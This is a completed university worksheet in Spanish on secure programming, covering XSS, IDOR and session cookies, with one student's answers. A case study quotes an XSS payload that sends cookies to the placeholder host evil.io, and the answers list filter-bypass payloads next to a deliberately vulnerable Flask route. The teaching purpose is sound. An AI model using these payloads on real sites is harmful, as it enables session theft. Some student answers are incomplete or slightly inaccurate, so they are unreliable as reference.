@@ -1,0 +1,506 @@
+# PROGRAMACIÓN SEGURA — DD281
+## Semana 6 | Gestión de Sesiones, XSS e IDOR
+
+---
+
+```
+PROGRAMACIÓN SEGURA — DD281
+Semana 6 | Gestión de Sesiones, XSS e IDOR
+Nombre: ______Jhoan Moreno_________________ Código: __________ Fecha: __________
+Tiempo: 90 minutos | Puntaje: 100 pts | Entrega: repositorio GitHub semana-06/guia/
+Instrucciones: Justifique sus respuestas en C y D. En A marque solo una opción.
+```
+
+---
+
+## SECCIÓN A — OPCIÓN MÚLTIPLE (20 puntos — 2 pts c/u)
+
+*Marque con una X la alternativa correcta. Solo una opción es válida por pregunta.*
+
+---
+
+**1.** ¿Qué significa XSS en seguridad web?
+
+a) Cross-Server Scripting — ejecución de scripts entre servidores
+
+[X]) Cross-Site Scripting — inyección de scripts en páginas web vistas por otros usuarios
+
+c) Cross-System Security — protocolo de seguridad entre sistemas
+
+d) Client-Side Script Execution — ejecución de scripts del lado del cliente por el servidor
+
+---
+
+**2.** ¿Cuál es el propósito del atributo `HttpOnly` en una cookie de sesión?
+
+a) Permite que la cookie solo funcione en conexiones HTTP, no HTTPS
+
+b) Impide que el servidor acceda a la cookie directamente
+
+[X]) Impide que el código JavaScript acceda a la cookie desde el navegador
+
+d) Limita el tamaño máximo del valor almacenado en la cookie
+
+---
+
+**3.** ¿Qué es IDOR (Insecure Direct Object Reference)?
+
+a) Un tipo de ataque que intercepta comunicaciones entre cliente y servidor
+
+[X]) Una vulnerabilidad donde un usuario accede a recursos de otros usuarios cambiando un identificador en la URL o request
+
+c) Un método para encriptar los identificadores de objetos en la base de datos
+
+d) Un protocolo para referenciar objetos de forma segura entre microservicios
+
+---
+
+**4.** ¿Qué función de Python/Flask convierte `<script>` en `&lt;script&gt;` para prevenir XSS?
+
+a) `str.encode()`
+
+b) `urllib.parse.quote()`
+
+[X]) `html.escape()`
+
+d) `base64.b64encode()`
+
+---
+
+**5.** Un foro web guarda los comentarios en la BD y los muestra sin escapar a todos los usuarios. ¿Qué tipo de XSS es este?
+
+a) XSS Reflejado (Reflected XSS)
+
+b) XSS basado en DOM (DOM-based XSS)
+
+[X]) XSS Almacenado (Stored/Persistent XSS)
+
+d) XSS de segundo orden (Second-order XSS)
+
+---
+
+**6.** ¿Qué hace el atributo `SameSite=Strict` en una cookie?
+
+[X]) Restringe la cookie para que solo se envíe en requests al mismo sitio web de origen
+
+b) Cifra el contenido de la cookie con AES-256
+
+c) Limita la cookie a solo el directorio raíz del sitio
+
+d) Impide que la cookie sea modificada por el usuario
+
+---
+
+**7.** ¿Cuál es la diferencia entre sanitizar el input y escapar el output?
+
+a) Son términos sinónimos que describen el mismo proceso
+
+[X]) Sanitizar elimina o modifica caracteres peligrosos al recibirlos; escapar los convierte en representaciones seguras al mostrarlos
+
+c) Sanitizar se aplica a HTML; escapar se aplica a SQL
+
+d) Sanitizar es para el backend; escapar es para el frontend
+
+---
+
+**8.** Un desarrollador implementa CSP con `script-src 'unsafe-inline'`. ¿Qué problema tiene esta configuración?
+
+a) Ninguno — unsafe-inline es la configuración recomendada por OWASP
+
+[X]) Permite la ejecución de scripts inline, lo que anula la protección principal del CSP contra XSS
+
+c) Bloquea completamente todos los scripts, rompiendo la funcionalidad del sitio
+
+d) Solo afecta a navegadores Internet Explorer, no a Chrome o Firefox
+
+---
+
+**9.** ¿Por qué se debe regenerar el session ID después de un login exitoso?
+
+a) Para reducir el tamaño de la cookie y mejorar el rendimiento
+
+[X]) Para prevenir Session Fixation, donde un atacante que conocía el session ID previo no pueda usarlo después de la autenticación
+
+c) Porque los session IDs tienen un formato diferente para usuarios autenticados
+
+d) Para cumplir con el estándar OAuth 2.0 de autenticación
+
+---
+
+**10.** En una API REST que devuelve `403 Forbidden` cuando se accede a un recurso de otro usuario y `404 Not Found` cuando no existe, ¿qué riesgo de seguridad existe?
+
+a) Ninguno — usar los códigos HTTP correctos es una buena práctica
+
+[X]) Permite enumeración de recursos: el atacante sabe cuáles IDs existen (403) y cuáles no (404)
+
+c) El código 403 viola el estándar REST y puede causar errores en los clientes
+
+d) Los usuarios pueden ver los datos de otros usuarios basándose en el código de error
+
+---
+
+## SECCIÓN B — COMPLETAR Y RELACIONAR (20 puntos)
+
+### B1. Complete los espacios en blanco (10 pts — 2 pts c/u)
+
+1. XSS almacenado es más peligroso que XSS reflejado porque el payload se guarda en la ___BASE DE DATOS ______________ del servidor y ataca a _____TODO____________ los usuarios que visiten la página.
+
+2. El atributo _____SECURE____________ en una cookie de sesión garantiza que solo se transmita a través de conexiones HTTPS, previniendo el robo por sniffing en redes inseguras.
+
+3. La vulnerabilidad IDOR pertenece a la categoría OWASP _____A01____________ (código) denominada _________BROKEN ACCES CONTROL________ en español.
+
+4. Content Security Policy (CSP) se implementa como un ____HEADER_____________ HTTP y permite al servidor declarar qué __FUENTES_______________ de contenido son legítimas para el navegador.
+
+5. Para prevenir Session Fixation, el servidor debe _____REGENERAR____________ el identificador de sesión inmediatamente después de que el usuario se ____AUNTENTIQUE_____________ exitosamente.
+
+---
+
+### B2. Relacionar columnas (10 pts — 1.67 pts c/u)
+
+*Escriba en la columna del medio la letra de la opción correcta de la Columna B.*
+
+| Columna A — Concepto | Respuesta | Columna B — Descripción / Ejemplo |
+|---|---|---|
+| 1. XSS Reflejado | → __d _ | a) `Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict` |
+| 2. XSS Almacenado | → _c__ | b) `GET /factura/1234` → cambiar a `/factura/1235` para ver facturas ajenas |
+| 3. IDOR | → _b__ | c) Script inyectado en comentario de blog que roba cookies de todos los lectores |
+| 4. Session Fixation | → __f_ | d) `<script>document.cookie</script>` enviado en parámetro de búsqueda de URL |
+| 5. Cookie segura | → _a__ | e) `Content-Security-Policy: default-src 'self'; script-src 'self'` |
+| 6. CSP | → _ e __ | f) Atacante envía link `login?PHPSESSID=CONOCIDO123` antes de que víctima se autentique |
+
+---
+
+## SECCIÓN C — ANÁLISIS Y REFLEXIÓN (30 puntos)
+
+### C1. (10 puntos)
+
+Analice el siguiente fragmento de código Flask e identifique:
+
+**(a)** ¿Qué vulnerabilidad(es) contiene?
+
+**(b)** ¿Cómo un atacante la explotaría? Proporcione un ejemplo concreto.
+
+**(c)** ¿Cómo la corregiría? Incluya el código corregido.
+
+```python
+@app.route('/perfil')
+def ver_perfil():
+    nombre = request.args.get('nombre', '')
+    return f"<h1>Perfil de {nombre}</h1><p>Bienvenido al sistema</p>"
+```
+
+*Espacio para respuesta:*
+El código contiene una vulnerabilidad de XSS Reflejado (Reflected Cross-Site Scripting), porque el valor recibido mediante el parámetro nombre de la URL se inserta directamente en el HTML sin ser escapado ni validado.
+_______________________________________________________________________________
+
+El atacante puede enviar una URL modificada con código JavaScript malicioso en el parámetro nombre.
+
+_______________________________________________________________________________
+Se debe escapar la entrada del usuario antes de mostrarla. En Flask/Jinja2 se recomienda usar plantillas con autoescape
+_______________________________________________________________________________
+
+_______________________________________________________________________________
+
+_______________________________________________________________________________
+
+_______________________________________________________________________________
+
+---
+
+### C2. (10 puntos)
+
+Una aplicación de e-commerce tiene el endpoint `GET /api/orden/{id}` que devuelve los detalles de una orden. El código del servidor verifica que el usuario esté autenticado pero **no** verifica si la orden pertenece al usuario autenticado.
+
+**(a)** ¿Qué vulnerabilidad describe este escenario y cómo la clasificarías según OWASP?
+
+**(b)** Describa paso a paso cómo un atacante la explotaría.
+
+**(c)** Escriba en pseudocódigo la verificación de autorización correcta.
+
+*Espacio para respuesta:*
+
+__a) La vulnerabilidad es IDOR (Insecure Direct Object Reference), también conocida como una falla de control de acceso a nivel de objeto.
+
+_______________________________________________________________________________
+
+b) El atacante inicia sesión correctamente en la aplicación con su propia cuenta.
+Accede a una orden propia:
+GET /api/orden/1001
+
+_______________________________________________________________________________
+ c) @app.route('/api/orden/<id>')
+def obtener_orden(id):
+
+    usuario = obtener_usuario_actual()
+
+    if usuario is None:
+        return "No autenticado", 401
+
+    orden = buscar_orden(id)
+
+    if orden is None:
+        return "Orden no encontrada", 404
+
+    # Verificar propiedad del recurso
+    if orden.usuario_id != usuario.id:
+        return "Acceso denegado", 403
+
+    return orden
+
+_______________________________________________________________________________
+
+---
+
+### C3. Mini caso (10 puntos)
+
+El equipo de seguridad de EduPerú (plataforma educativa con 200,000 estudiantes) encontró en sus logs estas cookies de sesión activas de usuarios:
+
+```
+Set-Cookie: usuario_session=eyJ1c2VyX2lkIjogMTIzNH0=; Path=/
+```
+
+**(a)** ¿Cuántos problemas de seguridad identifica en esta cookie? Enumérelos. (5 pts)
+
+**(b)** ¿Qué contiene el valor `eyJ1c2VyX2lkIjogMTIzNH0=` y por qué es un riesgo? *Pista: es Base64.* (5 pts)
+
+*Espacio para respuesta:*
+
+_______________________________________________________________________________
+
+a) No tiene atributo HttpOnly
+JavaScript del navegador podría acceder a la cookie mediante document.cookie.
+Si existe una vulnerabilidad XSS, un atacante podría robar la sesión.
+No tiene atributo Secure
+La cookie puede enviarse por conexiones HTTP sin cifrar.
+Un atacante en la misma red podría intentar capturarla mediante sniffing.
+No tiene atributo SameSite
+Puede ser enviada en solicitudes desde otros sitios.
+Aumenta el riesgo de ataques CSRF.
+El contenido de la cookie es información sensible en Base64
+Base64 no es cifrado, solo una codificación.
+Cualquier persona puede decodificar el valor y ver el contenido.
+El identificador de usuario está expuesto directamente
+La cookie contiene un user_id, lo que puede facilitar ataques de enumeración o manipulación si el servidor confía en ese valor.
+
+_______________________________________________________________________________
+
+b) 
+
+El riesgo es que Base64 no es un método de cifrado, solamente es una codificación. Cualquier persona que obtenga la cookie puede decodificarla fácilmente y conocer el identificador del usuario.
+
+_______________________________________________________________________________
+
+---
+
+## SECCIÓN D — AVANZADO Y DE CASO (30 puntos)
+
+**Caso profesional:** MedApp, una aplicación de telemedicina con 50,000 pacientes, implementó el siguiente sistema de mensajería entre pacientes y médicos. Durante una auditoría de seguridad, el equipo encontró que un médico malintencionado había enviado el siguiente mensaje a todos sus pacientes:
+
+```
+Hola, <img src="x" onerror="fetch('https://evil.io/steal?data='+btoa(document.cookie))">
+```
+
+Además, se reportó que pacientes podían ver historiales clínicos de otros pacientes cambiando el parámetro `paciente_id` en la URL del endpoint `/historial`.
+
+---
+
+### D1. Análisis técnico del ataque (10 puntos)
+
+Analice técnicamente el ataque del médico malintencionado respondiendo:
+
+- ¿Qué tipo de XSS es? ¿Por qué no usó `<script>` directamente?
+- ¿Qué hace exactamente `btoa(document.cookie)`?
+- ¿Qué información de los pacientes está en riesgo?
+- ¿Cómo clasifica este ataque según OWASP y qué impacto legal tiene en Perú?
+
+*Espacio para respuesta:*
+
+1. ¿Qué tipo de XSS es? ¿Por qué no usó <script> directamente?
+
+El ataque corresponde a un XSS Almacenado (Stored/Persistent XSS) si el código malicioso fue guardado en la plataforma (por ejemplo, en un comentario, campo de perfil o registro médico) y luego ejecutado por otros usuarios.
+
+No usó necesariamente <script> directamente porque muchos sistemas tienen filtros que bloquean etiquetas <script>. Los atacantes pueden utilizar otras formas de ejecutar JavaScript, como eventos HTML:
+
+Ejemplo:
+
+<img src=x onerror="btoa(document.cookie)">
+
+o técnicas de evasión para evitar los filtros.
+
+2. ¿Qué hace exactamente btoa(document.cookie)?
+
+document.cookie obtiene las cookies accesibles desde JavaScript en el navegador.
+
+Ejemplo:
+
+document.cookie
+
+puede devolver:
+
+session=abc123
+
+Luego:
+
+btoa(document.cookie)
+
+convierte ese contenido a Base64.
+
+Ejemplo:
+
+session=abc123
+
+se transforma en algo como:
+
+c2Vzc2lvbj1hYmMxMjM=
+
+Esto no cifra la información, solamente la codifica para facilitar su envío o lectura.
+
+3. ¿Qué información de los pacientes está en riesgo?
+
+Si el atacante roba una cookie de sesión válida, podría acceder a información protegida de la plataforma, como:
+
+Datos personales de pacientes.
+Historias clínicas.
+Diagnósticos médicos.
+Resultados de exámenes.
+Medicamentos y tratamientos.
+Datos de identificación y contacto.
+
+Además podría realizar acciones usando la cuenta de la víctima.
+
+4. ¿Cómo se clasifica según OWASP y qué impacto legal tiene en Perú?
+
+Según OWASP se clasifica como:
+
+A03: Injection (XSS - Cross-Site Scripting) en versiones recientes de OWASP Top 10.
+También puede relacionarse con A07: Identification and Authentication Failures si permite robo de sesiones.
+
+El impacto en Perú puede involucrar la vulneración de la Ley N.º 29733, Ley de Protección de Datos Personales, debido al tratamiento y exposición no autorizada de datos sensibles de salud.
+
+Las consecuencias pueden incluir:
+
+Sanciones administrativas.
+Responsabilidad legal por exposición de datos personales.
+Daño a la privacidad y confianza de los pacientes.
+---
+
+### D2. Diseño de solución (10 puntos)
+
+¿Cómo implementarías un sistema de mensajería seguro que prevenga tanto el XSS como el IDOR de historiales clínicos?
+
+Describe la arquitectura de seguridad: no el código completo, sino los controles clave, las verificaciones necesarias y las configuraciones de sesión que aplicarías.
+
+*Espacio para respuesta:*
+
+1. Prevención contra XSS:
+
+Validar y sanitizar los mensajes ingresados por los usuarios.
+Escapar la salida antes de mostrar cualquier contenido en el navegador (HTML escaping).
+No permitir la ejecución de JavaScript enviado por usuarios.
+Implementar una política CSP (Content Security Policy) para restringir la ejecución de scripts no autorizados.
+Usar frameworks con autoescape activado, como las plantillas seguras de Flask/Jinja2.
+
+2. Prevención contra IDOR en historiales clínicos:
+
+Aplicar control de acceso basado en permisos (RBAC).
+Verificar en cada solicitud que el usuario autenticado tenga autorización sobre el historial solicitado.
+No confiar únicamente en el ID enviado por la URL o API.
+Validar la relación entre el usuario, médico y paciente antes de devolver información.
+
+Ejemplo de validación:
+
+Usuario solicita historial 1234
+        ↓
+¿Está autenticado?
+        ↓
+¿Tiene permiso sobre ese paciente?
+        ↓
+Sí → Mostrar información
+No → Responder 403 Forbidden
+
+3. Seguridad de sesiones:
+
+Usar cookies con atributos:
+HttpOnly para evitar robo mediante JavaScript.
+Secure para permitir envío solo mediante HTTPS.
+SameSite=Strict para reducir ataques CSRF.
+Regenerar el identificador de sesión después del inicio de sesión para evitar Session Fixation.
+Implementar expiración de sesiones y cierre seguro.
+
+4. Arquitectura general:
+
+HTTPS para cifrar la comunicación.
+Backend con validación de autenticación y autorización.
+Base de datos con separación de roles y mínimo privilegio.
+Registro de auditoría (logs) para detectar accesos sospechosos.
+Cifrado de información médica sensible almacenada.
+
+### D3. Pensamiento crítico (10 puntos)
+
+El CTO de MedApp propone como solución al XSS: *"filtrar todos los mensajes que contengan las palabras `script`, `onerror`, `onclick` y `javascript`"*.
+
+Responda:
+
+1. ¿Esta solución es suficiente? Justifique.
+2. Mencione al menos **3 técnicas de bypass** que un atacante podría usar para evitar este filtro.
+3. Explique por qué el **escape de output** es superior a los filtros de input para prevenir XSS.
+
+*Espacio para respuesta:*
+
+1. ¿Esta solución es suficiente? Justifique.
+
+No, esta solución no es suficiente para prevenir XSS.
+
+Un filtro basado solamente en palabras prohibidas es una defensa débil porque los atacantes pueden modificar la forma del payload sin usar exactamente esas palabras. Además, existen muchas formas diferentes de ejecutar JavaScript en un navegador.
+
+La prevención correcta debe basarse en escape de salida, sanitización segura de HTML, validación de entradas y políticas como CSP (Content Security Policy).
+
+2. Técnicas de bypass que puede usar un atacante
+
+Algunas técnicas son:
+
+a) Usar codificación HTML o Unicode
+
+Ejemplo:
+
+<img src=x onerror=&#x61;lert(1)>
+
+El navegador interpreta la codificación y puede ejecutar el código.
+
+b) Usar eventos HTML diferentes
+
+Si el filtro bloquea onclick u onerror, el atacante puede probar otros eventos:
+
+<img src=x onload=alert(1)>
+
+o:
+
+<body onfocus=alert(1)>
+
+c) Evitar la palabra "script" usando otras etiquetas o técnicas
+
+Ejemplo:
+
+No utiliza <script> pero puede ejecutar JavaScript.
+
+3. ¿Por qué el escape de output es superior a los filtros de input?
+
+El escape de output es superior porque convierte caracteres peligrosos en texto seguro justo antes de mostrarlos al usuario.
+
+Ejemplo:
+
+Entrada del atacante:
+
+<script>alert('XSS')</script>
+
+Con escape:
+
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+El navegador lo interpreta como texto y no como código ejecutable.
+
+Los filtros de entrada intentan bloquear patrones conocidos, pero no pueden conocer todas las variantes posibles de un ataque. El escape de salida protege el contexto donde realmente ocurre la ejecución.
+
+---
+
+*Fin de la guía — Semana 6 | Universidad Autónoma del Perú | Programación Segura DD281*
